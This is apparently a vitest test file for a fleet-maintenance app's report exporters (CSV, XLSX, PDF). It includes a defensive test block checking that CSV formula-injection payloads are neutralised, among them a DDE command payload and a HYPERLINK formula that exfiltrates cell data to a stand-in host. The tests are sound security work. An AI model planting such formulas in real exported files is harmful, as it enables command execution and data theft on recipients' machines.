/**
 * Export serialisers — FF-1206 (RPT-06).
 *
 * The acceptance criterion is that all three formats come from the same result
 * set. That is structural — one `ReportResult` in, bytes out — so what is left
 * to test is whether each format is *correct*: quoting that survives a comma in
 * a vendor name, numbers that a spreadsheet will actually add up, and files that
 * open at all.
 *
 * These are the failures that never appear in a log. A CSV with a shifted column
 * is a spreadsheet full of plausible wrong numbers, and it is the recipient who
 * finds out, not us.
 */

import type { ReportResult } from '@fleetflow/shared';
import ExcelJS from 'exceljs';
import { describe, expect, it } from 'vitest';
import { exportFilename, serialise, toCsv, toPdf, toXlsx } from './serialisers.js';

function report(overrides: Partial<ReportResult> = {}): ReportResult {
  return {
    report: 'cost-by-vehicle',
    title: 'Maintenance cost per vehicle',
    description: 'Completed maintenance spend, grouped by vehicle.',
    generatedAt: '2026-08-14T09:30:00.000Z',
    columns: [
      { key: 'plate', label: 'Vehicle', type: 'text' },
      { key: 'operations', label: 'Operations', type: 'integer' },
      { key: 'total', label: 'Total', type: 'money' },
      { key: 'lastCompleted', label: 'Last serviced', type: 'date' },
    ],
    rows: [
      { plate: '12345-A-6', operations: 3, total: 1234.5, lastCompleted: '2026-06-27' },
      { plate: '55120-C-1', operations: 1, total: 0, lastCompleted: null },
    ],
    totals: { plate: '2 vehicles', operations: 4, total: 1234.5, lastCompleted: null },
    appliedFilters: { from: '2026-01-01' },
    supportedFilters: ['from', 'to', 'vehicleId'],
    currency: 'USD',
    page: 1,
    pageSize: 2,
    total: 2,
    ...overrides,
  };
}

/**
 * The BOM is deliberate (Excel on Windows); stripping it makes assertions
 * readable.
 *
 * Built from its code point rather than written literally: a bare U+FEFF in
 * source is invisible to a reader and lint rightly refuses it.
 */
const BOM = String.fromCharCode(0xfeff);

function csvText(result: ReportResult): string {
  const text = toCsv(result).body.toString('utf8');
  return text.startsWith(BOM) ? text.slice(BOM.length) : text;
}

describe('toCsv', () => {
  it('writes a header, the rows, then the totals', () => {
    const lines = csvText(report()).split('\r\n');
    expect(lines[0]).toBe('Vehicle,Operations,Total,Last serviced');
    expect(lines[1]).toBe('12345-A-6,3,1234.5,2026-06-27');
    expect(lines[3]).toBe('2 vehicles,4,1234.5,');
  });

  it('uses CRLF line endings, per RFC 4180', () => {
    expect(csvText(report())).toContain('\r\n');
  });

  it('starts with a UTF-8 BOM so Excel on Windows reads accents correctly', () => {
    // Without it Excel assumes the local ANSI codepage and a driver called
    // "Toure" with an accent arrives as mojibake.
    expect(toCsv(report()).body.subarray(0, 3)).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });

  it('quotes a value containing a comma', () => {
    // The classic column-shift bug: "Auto Parts, Ltd." unquoted becomes two
    // fields and every later column in that row is wrong.
    const text = csvText(
      report({
        columns: [
          { key: 'vendor', label: 'Vendor', type: 'text' },
          { key: 'total', label: 'Total', type: 'money' },
        ],
        rows: [{ vendor: 'Auto Parts, Ltd.', total: 10 }],
        totals: null,
      }),
    );
    expect(text.split('\r\n')[1]).toBe('"Auto Parts, Ltd.",10');
  });

  it('doubles an embedded quote', () => {
    const text = csvText(
      report({
        columns: [{ key: 'vendor', label: 'Vendor', type: 'text' }],
        rows: [{ vendor: 'The "Best" Garage' }],
        totals: null,
      }),
    );
    expect(text.split('\r\n')[1]).toBe('"The ""Best"" Garage"');
  });

  it('quotes a value containing a newline', () => {
    const text = csvText(
      report({
        columns: [{ key: 'notes', label: 'Notes', type: 'text' }],
        rows: [{ notes: 'line one\nline two' }],
        totals: null,
      }),
    );
    expect(text).toContain('"line one\nline two"');
  });

  it('writes null as an empty field, not "null"', () => {
    expect(csvText(report()).split('\r\n')[2]).toBe('55120-C-1,1,0,');
  });

  it('writes money unformatted so a spreadsheet can sum it', () => {
    // `"$1,234.50"` is a string no spreadsheet will add up, which defeats the
    // point of exporting to CSV at all.
    const text = csvText(report());
    expect(text).toContain('1234.5');
    expect(text).not.toContain('$');
    expect(text).not.toContain('1,234.50');
  });

  it('emits only a header when there are no rows', () => {
    const text = csvText(report({ rows: [], totals: null }));
    expect(text).toBe('Vehicle,Operations,Total,Last serviced');
  });

  it('follows the column order, not the key order of the row object', () => {
    const text = csvText(
      report({
        columns: [
          { key: 'b', label: 'B', type: 'text' },
          { key: 'a', label: 'A', type: 'text' },
        ],
        // Deliberately reversed: a serialiser iterating the row's own keys
        // would emit these the wrong way round.
        rows: [{ a: 'first', b: 'second' }],
        totals: null,
      }),
    );
    expect(text.split('\r\n')[1]).toBe('second,first');
  });

  it('leaves a key missing from the row as an empty field', () => {
    const text = csvText(report({ rows: [{ plate: 'X' }], totals: null }));
    expect(text.split('\r\n')[1]).toBe('X,,,');
  });

  /**
   * CSV formula injection — FF-1203.
   *
   * A cell beginning `=`, `+`, `-` or `@` is executed by Excel, LibreOffice and
   * Sheets when the file is opened. Vendor names and maintenance titles are
   * typed by users and land in these columns, so somebody who can write one can
   * put a formula into a file an accountant later opens. This is the one place
   * in the product where stored text becomes executable somewhere else.
   */
  describe('formula injection', () => {
    function firstCell(value: string): string {
      const text = csvText(
        report({
          columns: [{ key: 'vendor', label: 'Vendor', type: 'text' }],
          rows: [{ vendor: value }],
          totals: null,
        }),
      );
      return text.split('\r\n')[1] ?? '';
    }

    it.each(['=1+1', '+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1'])('neutralises %j', (payload) => {
      expect(firstCell(payload).replace(/^"/, '')).toMatch(/^'/);
    });

    it('neutralises a DDE command payload', () => {
      const cell = firstCell("=cmd|' /c calc'!A1");
      expect(cell).toContain("'=cmd");
    });

    it('neutralises an exfiltrating HYPERLINK', () => {
      expect(firstCell('=HYPERLINK("http://evil.test?x"&A1,"Click")')).toMatch(/^"?'=HYPERLINK/);
    });

    it('leaves ordinary text untouched', () => {
      // Over-escaping would put a stray apostrophe in front of every vendor
      // name in the file.
      expect(firstCell('Auto Parts Ltd')).toBe('Auto Parts Ltd');
      expect(firstCell('12345-A-6')).toBe('12345-A-6');
    });

    it('leaves negative numbers as numbers', () => {
      // A cost of -25 must stay summable. Only *text* cells are neutralised.
      const text = csvText(
        report({
          columns: [{ key: 'total', label: 'Total', type: 'money' }],
          rows: [{ total: -25.5 }],
          totals: null,
        }),
      );
      expect(text.split('\r\n')[1]).toBe('-25.5');
    });
  });
});

describe('toXlsx', () => {
  async function readBack(result: ReportResult): Promise<ExcelJS.Worksheet> {
    const { body } = await toXlsx(result);
    const workbook = new ExcelJS.Workbook();
    // `as never`: exceljs types the reader as accepting a Node stream, but the
    // buffer overload is what it actually supports and what the docs use.
    await workbook.xlsx.load(body as never);
    const sheet = workbook.worksheets[0];
    if (!sheet) throw new Error('no worksheet');
    return sheet;
  }

  it('is a real xlsx package', async () => {
    const { body, contentType } = await toXlsx(report());
    // `PK` — a zip local file header. An xlsx that is not a zip opens nowhere.
    expect(body.subarray(0, 2).toString('latin1')).toBe('PK');
    expect(contentType).toContain('spreadsheetml');
  });

  it('writes numbers as numbers, not strings', async () => {
    const sheet = await readBack(report());
    expect(sheet.getRow(2).getCell(3).value).toBe(1234.5);
    expect(typeof sheet.getRow(2).getCell(2).value).toBe('number');
  });

  it('writes dates as real dates so they sort chronologically', async () => {
    const sheet = await readBack(report());
    expect(sheet.getRow(2).getCell(4).value).toBeInstanceOf(Date);
  });

  it('applies a money format with two decimals', async () => {
    const sheet = await readBack(report());
    expect(sheet.getRow(2).getCell(3).numFmt).toBe('#,##0.00');
    // A count must never render as "3.00".
    expect(sheet.getRow(2).getCell(2).numFmt).toBe('#,##0');
  });

  it('freezes the header row', async () => {
    const sheet = await readBack(report());
    const view = sheet.views[0];
    expect(view?.state).toBe('frozen');
    // `ySplit` exists only on the frozen variant of the view union.
    expect(view?.state === 'frozen' ? view.ySplit : undefined).toBe(1);
  });

  it('separates the totals row from the data with a blank row', async () => {
    // So an autofilter or pivot over the data range does not treat the footer
    // as another record.
    const sheet = await readBack(report());
    expect(sheet.getRow(4).getCell(1).value).toBeFalsy();
    expect(sheet.getRow(5).getCell(1).value).toBe('2 vehicles');
    expect(sheet.getRow(5).font?.bold).toBe(true);
  });

  it('truncates a sheet name to Excel’s 31-character limit', async () => {
    const sheet = await readBack(report({ title: 'A'.repeat(60) }));
    expect(sheet.name.length).toBeLessThanOrEqual(31);
  });

  it('produces a valid file with no rows', async () => {
    const sheet = await readBack(report({ rows: [], totals: null }));
    expect(sheet.getRow(1).getCell(1).value).toBe('Vehicle');
  });
});

describe('toPdf', () => {
  it('is a real PDF', async () => {
    const { body, contentType } = await toPdf(report());
    expect(body.subarray(0, 5).toString('latin1')).toBe('%PDF-');
    expect(contentType).toBe('application/pdf');
    // Not a stub: a header-only PDF is under a kilobyte.
    expect(body.byteLength).toBeGreaterThan(1000);
  });

  it('renders without rows', async () => {
    const { body } = await toPdf(report({ rows: [], totals: null }));
    expect(body.subarray(0, 5).toString('latin1')).toBe('%PDF-');
  });

  it('renders a wide table across many columns', async () => {
    // The eleven-column maintenance history is the widest report; a layout that
    // divides by zero or overflows shows up here rather than in production.
    const columns = Array.from({ length: 11 }, (_, index) => ({
      key: `c${index}`,
      label: `Column ${index}`,
      type: 'text' as const,
    }));
    const { body } = await toPdf(
      report({
        columns,
        rows: [Object.fromEntries(columns.map((c) => [c.key, 'value']))],
        totals: null,
      }),
    );
    expect(body.byteLength).toBeGreaterThan(1000);
  });

  it('renders every row when there are enough to paginate', async () => {
    const rows = Array.from({ length: 200 }, (_, index) => ({
      plate: `PLATE-${index}`,
      operations: index,
      total: index * 10,
      lastCompleted: '2026-06-27',
    }));
    const { body } = await toPdf(report({ rows, totals: null, total: rows.length }));
    expect(body.byteLength).toBeGreaterThan(5000);
  });
});

describe('serialise', () => {
  it('dispatches to each format', async () => {
    expect((await serialise(report(), 'csv')).extension).toBe('csv');
    expect((await serialise(report(), 'xlsx')).extension).toBe('xlsx');
    expect((await serialise(report(), 'pdf')).extension).toBe('pdf');
  });

  it('reports a byte length matching the body, for Content-Length', async () => {
    for (const format of ['csv', 'xlsx', 'pdf'] as const) {
      const file = await serialise(report(), format);
      expect(file.body.byteLength).toBe(Buffer.byteLength(file.body));
    }
  });
});

describe('exportFilename', () => {
  it('names the file after the report and the date it was generated', () => {
    expect(exportFilename(report(), 'csv')).toBe('cost-by-vehicle-2026-08-14.csv');
  });

  it('produces a name safe to put in a Content-Disposition header', () => {
    // Report names come from a closed enum, so this is a regression guard: a
    // quote or a newline here would let the header be split.
    expect(exportFilename(report(), 'pdf')).toMatch(/^[a-z0-9-]+\.[a-z]+$/);
  });
});
